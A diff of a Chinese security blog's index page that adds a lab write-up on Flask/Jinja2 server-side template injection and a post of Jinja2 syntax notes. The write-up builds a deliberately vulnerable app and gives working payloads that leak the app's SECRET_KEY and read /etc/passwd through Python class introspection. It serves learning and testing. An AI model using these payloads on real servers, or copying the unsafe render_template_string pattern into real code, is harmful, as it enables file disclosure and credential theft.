@@ -258,6 +258,528 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/28/SSTI服务器模板注入/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/05/28/SSTI服务器模板注入/" itemprop="url">
+                  SSTI服务器模板注入
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-28T23:17:58+08:00">
+                2018-05-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/05/28/SSTI服务器模板注入/" class="leancloud_visitors" data-flag-title="SSTI服务器模板注入">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>前段时间打本校的ctf，有道叫幸运数字的题，只挖到一个xss，看了很久对题完全没有头绪，后来交wp的时候，出题师傅在群里说是SSTI，然后就去百度了一下，复现并学习一下这个漏洞。</p>
+<h2 id="0x01-SSTI服务端模板注入"><a href="#0x01-SSTI服务端模板注入" class="headerlink" title="0x01 SSTI服务端模板注入"></a>0x01 SSTI服务端模板注入</h2><p>服务端模板注入是服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。</p>
+<p>通常测试模块类型的方式如下图：</p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/ssti/ssti01.png" alt=""></p>
+<h2 id="0x02-环境配置"><a href="#0x02-环境配置" class="headerlink" title="0x02 环境配置"></a>0x02 环境配置</h2><p>前面两篇正好写了python的后端模块flask和jinja2，这次我们使用flask+jinja2框架来测试一下。</p>
+<p>首先后端是python，所以需要python环境，python在官网下载并安装，配置环境变量即可。</p>
+<p>接着我们安装需要用到的库</p>
+<ul>
+<li>pip install jinja2</li>
+<li>pip install flask</li>
+<li>pip install virtualenv</li>
+</ul>
+<p>只要上述所有库成功安装，环境就配置完毕了。</p>
+<h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><p>我们的环境需要一个run.py文件和一个templates文件夹，templates文件夹内要有一个index.html。</p>
+<p>index.html内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;&#123;% block title %&#125;test pages&#123;% endblock %&#125;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;center&gt;</span><br><span class="line">			&lt;p&gt;请输入你的昵称&lt;/p&gt;</span><br><span class="line">			&lt;form method=&quot;post&quot; action=&quot;/check&quot;&gt;</span><br><span class="line"></span><br><span class="line">			&lt;p&gt;</span><br><span class="line">			&lt;input type=&quot;text&quot; name=&quot;name&quot; required&gt;</span><br><span class="line">			&lt;/p&gt;</span><br><span class="line">			&lt;br&gt;</span><br><span class="line">			&lt;p&gt;</span><br><span class="line">			&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot;&gt;</span><br><span class="line">			&lt;/p&gt;</span><br><span class="line">			&lt;/form&gt;</span><br><span class="line">	&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
+<p>可以看到，html中只有一个post型的from需要我们填写提交。</p>
+<p>然后是run.py（注意这次我用了python2.7）:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#python2.7</span><br><span class="line">import jinja2</span><br><span class="line">from flask import Flask,render_template, render_template_string, flash, redirect, url_for, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config.from_object(__name__)</span><br><span class="line">app.config[&apos;SECRET_KEY&apos;] = &quot;password:123456789&quot;</span><br><span class="line"></span><br><span class="line">@app.route(&apos;/&apos;)</span><br><span class="line">def index():</span><br><span class="line">    return render_template(&apos;index.html&apos;)</span><br><span class="line"></span><br><span class="line">@app.route(&apos;/check&apos;,methods=[&apos;POST&apos;, &apos;GET&apos;])</span><br><span class="line">def check():</span><br><span class="line">	if request.method == &apos;POST&apos;:</span><br><span class="line">		name = str(request.form[&apos;name&apos;])</span><br><span class="line">		template = u&apos;&apos;&apos;</span><br><span class="line">		&lt;center&gt;</span><br><span class="line">			&lt;p&gt;你好, %s, 欢迎来到我的页面&lt;/p&gt;</span><br><span class="line">			&lt;a href=&quot;/&quot;&gt;点这里退出&lt;/a&gt;</span><br><span class="line">		&lt;/center&gt;</span><br><span class="line">		&apos;&apos;&apos; % (name)</span><br><span class="line">		return render_template_string(template)</span><br><span class="line">		</span><br><span class="line">@app.errorhandler(404)</span><br><span class="line">def page_not_found(e):</span><br><span class="line">	return render_template(&apos;404.html&apos;),404</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure></p>
+<p>这里python文件实现了将几个页面通过jinja2模块渲染部署，然后添加了一个敏感数据SECRET_KEY一会用得到，剩下的就是将index.html页面post过来的name，在网站check路径的页面中作为字符串输出。</p>
+<p>我们在run.py目录打开命令行先输入python run.py先将服务运行起来：</p>
+<p>然后我们打开浏览器输入127.0.0.1:5000，成功显示index.html中的页面：</p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/ssti/ssti02.png" alt=""></p>
+<p>我们输入任意字符串，浏览器跳转到127.0.0.1:5000/check目录，并且在网页中输出我们的字符串：</p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/ssti/ssti03.png" alt=""></p>
+<p>如上几步如果都成功，我们漏洞环境就搭建完成了。</p>
+<h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h2><p>我们先尝试一下刚才图中的测试数据，输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;7*&apos;7&apos;&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>发现结果如下：</p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/ssti/ssti04.png" alt=""></p>
+<p>config是Flask模版中的一个全局对象，它代表“当前配置对象(flask.config)”，它是一个类字典的对象，它包含了所有应用程序的配置值。在大多数情况下，它包含了比如数据库链接字符串，连接到第三方的凭证，SECRET_KEY等敏感值。查看这些配置项目，我们只需注入如下命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; config.items() &#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>发现结果中存在我们刚才故意放进去的敏感信息：</p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/ssti/ssti05.png" alt=""></p>
+<p>在接下来的步骤之前，我先介绍两个内省实用程序：<strong>mro</strong>以及<strong>subclasses</strong>属性。</p>
+<p><strong>mro</strong>中的MRO(Method Resolution Order)代表着解析方法调用的顺序，它是每个对象元类的一个隐藏属性，当进行内省时会忽略dir输出。</p>
+<p><strong>subclasses</strong>属性在这里作为一种方法被定义为，对每个new-style class“为它的直接子类维持一个弱引用列表”，之后“返回一个包含所有存活引用的列表”。</p>
+<p><strong>mro</strong>允许我们在当前Python环境中追溯对象继承树，之后<strong>subclasses</strong>又让我们回到原点。从一个new-style object开始，例如str类型。使用<strong>mro</strong>我们可以从继承树爬到根对象类，之后在Python环境中使用<strong>subclasses</strong>爬向每一个new-style object。ok，这让我们能够访问加载到当前Python环境下的所有类。这样，我们就可以实现很多功能。</p>
+<p>首先我们要做的第一件事便是选择一个new-style object用于访问object基类。我们可以使用<strong>mro</strong>属性访问对象的继承类。<br>输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &apos;&apos;.__class__.__mro__ &#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/ssti/ssti06.png" alt=""></p>
+<p>得到反馈只有str、basestring和object，按照数组的排序，我们应该选<strong>mro</strong>的第三个，也就是<strong>mro</strong>[2]，接下来我们构造<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &apos;&apos;.__class__.__mro__[2].__subclasses__() &#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/ssti/ssti07.png" alt=""></p>
+<p>可以查看到非常非常多的可访问类，这个时候我们要找到<type 'file'="">类，它是文件系统访问的关键。</type></p>
+<p>然后我们可以用file类的read()方法访问一下当前目录的文本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;./2333.txt&apos;).read() &#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/ssti/ssti08.png" alt=""></p>
+<p>访问敏感目录可以得到很多信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/etc/passwd&apos;).read() &#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/ssti/ssti09.png" alt=""></p>
+<p>我们就可以参考目标系统目录结构，对目标系统敏感文件进行访问。</p>
+<h2 id="0x05-参考资料"><a href="#0x05-参考资料" class="headerlink" title="0x05 参考资料"></a>0x05 参考资料</h2><ul>
+<li><a href="https://portswigger.net/blog/server-side-template-injection" target="_blank" rel="noopener">https://portswigger.net/blog/server-side-template-injection</a></li>
+<li><a href="http://www.freebuf.com/articles/web/98619.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/98619.html</a></li>
+<li><a href="https://nvisium.com/blog/2015/12/07/injecting-flask/" target="_blank" rel="noopener">https://nvisium.com/blog/2015/12/07/injecting-flask/</a></li>
+</ul>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/28/python-jinja2模块学习/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/05/28/python-jinja2模块学习/" itemprop="url">
+                  python-jinja2模块学习
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-28T11:17:25+08:00">
+                2018-05-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/python/" itemprop="url" rel="index">
+                    <span itemprop="name">python</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/python/笔记/" itemprop="url" rel="index">
+                    <span itemprop="name">笔记</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/05/28/python-jinja2模块学习/" class="leancloud_visitors" data-flag-title="python-jinja2模块学习">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>上次总结了python flask模板，flask模板是一个包含响应文本的文件，其中包含用占位变量表示的动态部分，其具体指只在请求的上下文中才能知道。使用真是只替换变量，再返回最终得到的响应字符串，这一过程称为渲染。为了渲染模板，Flask使用了一个名为Jinja2的强大模板引擎。这次记录一下jinja2模块的学习，用作笔记。</p>
+<h2 id="0x01-jinja2"><a href="#0x01-jinja2" class="headerlink" title="0x01 jinja2"></a>0x01 jinja2</h2><p>Jinja2是基于python的模板引擎，功能比较类似于于PHP的smarty，J2ee的Freemarker和velocity。 它能完全支持unicode，并具有集成的沙箱执行环境。jinja2使用BSD授权。起初是Flask作者模仿django模板的一个模板引擎，为Flask提供模板支持，由于其灵活，快速和安全等优点被广泛使用。</p>
+<h2 id="0x02-安装"><a href="#0x02-安装" class="headerlink" title="0x02 安装"></a>0x02 安装</h2><p>python库的安装都十分方便，jinja2也不例外，我们直接在命令行输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install jinja2</span><br></pre></td></tr></table></figure></p>
+<p>即可安装。</p>
+<h2 id="0x03-基本语法"><a href="#0x03-基本语法" class="headerlink" title="0x03 基本语法"></a>0x03 基本语法</h2><p>在jinja2中，存在三种语法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">控制结构 &#123;% %&#125;</span><br><span class="line">变量取值 &#123;&#123; &#125;&#125;</span><br><span class="line">注释 &#123;# #&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="0x04-变量"><a href="#0x04-变量" class="headerlink" title="0x04 变量"></a>0x04 变量</h2><p>jinja2模板中使用两个花括号嵌套 语法表示一个变量，它是一种特殊的占位符。当利用jinja2进行渲染的时候，它会把这些特殊的占位符进行填充/替换，jinja2支持python中所有的Python数据类型比如列表、字段、对象等。</p>
+<p>如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;this is a dicectory:&#123;&#123; mydict[&apos;key&apos;] &#125;&#125; &lt;/p&gt;</span><br><span class="line">&lt;p&gt;this is a list:&#123;&#123; mylist[3] &#125;&#125; &lt;/p&gt;</span><br><span class="line">&lt;p&gt;this is a object:&#123;&#123; myobject.something() &#125;&#125; &lt;/p&gt;</span><br></pre></td></tr></table></figure></p>
+<h2 id="0x05-过滤器"><a href="#0x05-过滤器" class="headerlink" title="0x05 过滤器"></a>0x05 过滤器</h2><p>花括号中的变量传输进来时，我们要对其进行一些对字符串的常规操作或者提升安全性的操作，这个时候可以使用jinja2自带的过滤器。</p>
+<p>常用的过滤器：</p>
+<table>
+<thead>
+<tr>
+<th>过滤器</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>safe</td>
+<td>渲染时值不转义</td>
+</tr>
+<tr>
+<td>capitialize</td>
+<td>把值的首字母转换成大写，其他子母转换为小写</td>
+</tr>
+<tr>
+<td>lower</td>
+<td>把值转换成小写形式 </td>
+</tr>
+<tr>
+<td>upper</td>
+<td>把值转换成大写形式 </td>
+</tr>
+<tr>
+<td>title</td>
+<td>把值中每个单词的首字母都转换成大写</td>
+</tr>
+<tr>
+<td>trim</td>
+<td>把值的首尾空格去掉</td>
+</tr>
+<tr>
+<td>striptags</td>
+<td>渲染之前把值中所有的HTML标签都删掉</td>
+</tr>
+<tr>
+<td>join</td>
+<td>拼接多个值为字符串</td>
+</tr>
+<tr>
+<td>replace</td>
+<td>替换字符串的值</td>
+</tr>
+<tr>
+<td>round</td>
+<td>默认对数字进行四舍五入，也可以用参数进行控制</td>
+</tr>
+<tr>
+<td>int</td>
+<td>把值转换成整型</td>
+</tr>
+</tbody>
+</table>
+<p>过滤器的用法是在变量后面使用管道(|)分割，多个过滤器可以链式调用，前一个过滤器的输出会作为后一个过滤器的输入。</p>
+<p>如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &apos;abc&apos; | upper  &#125;&#125;</span><br><span class="line"># ABC</span><br><span class="line">&#123;&#123; &apos;hello world&apos; | title  &#125;&#125;</span><br><span class="line"># Hello World</span><br><span class="line">&#123;&#123; 18.18 | round | int &#125;&#125;</span><br><span class="line"># 18</span><br></pre></td></tr></table></figure></p>
+<h2 id="0x06-分支"><a href="#0x06-分支" class="headerlink" title="0x06 分支"></a>0x06 分支</h2><p>jinja2中的if语句类似与Python的if语句，它也具有单分支，多分支等多种结构，不同的是，条件语句不需要使用冒号结尾，而结束控制语句，需要使用endif关键字。</p>
+<p>如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if grade&gt;=90 %&#125;</span><br><span class="line">excellent</span><br><span class="line">&#123;% elif grade&gt;=60 %&#125;</span><br><span class="line">great</span><br><span class="line">&#123;% else %&#125;</span><br><span class="line">bad</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="0x07-循环"><a href="#0x07-循环" class="headerlink" title="0x07 循环"></a>0x07 循环</h2><p>jinja2中的for循环用于迭代Python的数据类型，包括列表，元组和字典。在jinja2中不存在while循环。</p>
+<p>迭代列表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;ul&gt;</span><br><span class="line">&#123;% for user in users %&#125;</span><br><span class="line">&lt;li&gt;&#123;&#123; user.username|title &#125;&#125;&lt;/li&gt;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure></p>
+<p>迭代字典<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;dl&gt;</span><br><span class="line">&#123;% for key, value in my_dict.iteritems() %&#125;</span><br><span class="line">&lt;dt&gt;&#123;&#123; key &#125;&#125;&lt;/dt&gt;</span><br><span class="line">&lt;dd&gt;&#123;&#123; value&#125;&#125;&lt;/dd&gt;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line">&lt;/dl&gt;</span><br></pre></td></tr></table></figure></p>
+<p>在for循环中，jinja2还提供了一些特殊的变量，用以来获取当前的遍历状态：</p>
+<table>
+<thead>
+<tr>
+<th>变量</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>loop.index</td>
+<td>当前迭代的索引（从1开始）</td>
+</tr>
+<tr>
+<td>loop.index0</td>
+<td>当前迭代的索引（从0开始）</td>
+</tr>
+<tr>
+<td>loop.first</td>
+<td>是否是第一次迭代，返回bool</td>
+</tr>
+<tr>
+<td>loop.last</td>
+<td>是否是最后一次迭代，返回bool</td>
+</tr>
+<tr>
+<td>loop.length</td>
+<td>序列中的项目数量</td>
+</tr>
+<tr>
+<td>loop.revindex</td>
+<td>到循环结束的次数（从1开始）</td>
+</tr>
+<tr>
+<td>loop.revindex0</td>
+<td>到循环结束的次数(从0开始）</td>
+</tr>
+</tbody>
+</table>
+<h2 id="0x08-宏"><a href="#0x08-宏" class="headerlink" title="0x08 宏"></a>0x08 宏</h2><p>宏类似于Python中的函数（其实就是函数的用法），我们在宏中定义行为，还可以进行传递参数。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% macro input(name,age=18) %&#125;</span><br><span class="line"> &lt;input type=&apos;text&apos; name=&quot;&#123;&#123; name &#125;&#125;&quot; value=&quot;&#123;&#123; age &#125;&#125;&quot; &gt;</span><br><span class="line">&#123;% endmacro %&#125;</span><br></pre></td></tr></table></figure>
+<p>调用:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;&#123;&#123; input(&apos;daxin&apos;) &#125;&#125; &lt;/p&gt;</span><br><span class="line">&lt;p&gt;&#123;&#123; input(&apos;daxin&apos;,age=20) &#125;&#125; &lt;/p&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="0x09-继承"><a href="#0x09-继承" class="headerlink" title="0x09 继承"></a>0x09 继承</h2><p>jinja2中最强大的部分就是模板继承。模板继承允许我们创建一个基本文件，其他文件从该骨架文件继承，然后针对自己需要的地方进行修改。</p>
+<p>骨架文件中，block关键字表示其包涵的内容可以进行修改。</p>
+<p>如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;title&gt;&#123;% block title %&#125;Leticia&apos;s Blog&#123;% endblock %&#125;&lt;/title&gt;</span><br></pre></td></tr></table></figure></p>
+<p>我们要替换的时候</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% block title %&#125;xxx&apos;s Blog&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="0x10-渲染模板"><a href="#0x10-渲染模板" class="headerlink" title="0x10 渲染模板"></a>0x10 渲染模板</h2><p>默认情况下，Flask在程序文件夹中的templates子文件夹中寻找模板。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import jinja2</span><br><span class="line">from flask import Flask, render_template</span><br><span class="line"></span><br><span class="line">    app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">    @app.route(&apos;/&apos;)</span><br><span class="line">    def index():</span><br><span class="line">        return render_template(&apos;index.html&apos;)</span><br><span class="line"></span><br><span class="line">    @app.route(&apos;/user/&lt;name&gt;&apos;)</span><br><span class="line">    def user(name):</span><br><span class="line">        return render_template(&apos;user.html&apos;, name=name)</span><br></pre></td></tr></table></figure></p>
+<p>render_template 函数的第一个参数是模板的文件名（index.html，user.html），随后的参数都是键值对（name=name），表示模板中变量的真实值。</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/25/python-flask模块学习/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2102,393 +2624,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/08/内网渗透常用命令总结（linux）/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2018/05/08/内网渗透常用命令总结（linux）/" itemprop="url">
-                  内网渗透常用命令总结（linux）
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-08T21:34:32+08:00">
-                2018-05-08
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/笔记/" itemprop="url" rel="index">
-                    <span itemprop="name">笔记</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2018/05/08/内网渗透常用命令总结（linux）/" class="leancloud_visitors" data-flag-title="内网渗透常用命令总结（linux）">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
